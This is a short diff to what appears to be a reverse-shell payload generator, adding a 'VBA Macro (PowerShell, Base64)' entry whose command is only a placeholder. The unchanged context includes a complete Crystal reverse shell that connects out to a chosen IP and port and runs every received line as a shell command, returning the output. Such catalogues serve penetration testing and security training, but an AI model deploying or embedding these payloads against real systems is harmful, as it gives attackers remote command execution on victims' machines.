@@ -390,6 +390,11 @@ const reverseShellCommands = withCommandType(
             "name": "Crystal (code)",
             "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
             "meta": ["linux", "mac"]
+        },
+        {
+            "name": "VBA Macro (PowerShell, Base64)",
+            "command": "__VBA_MACRO__",
+            "meta": ["windows","reverse"]
         }
     ]
 );
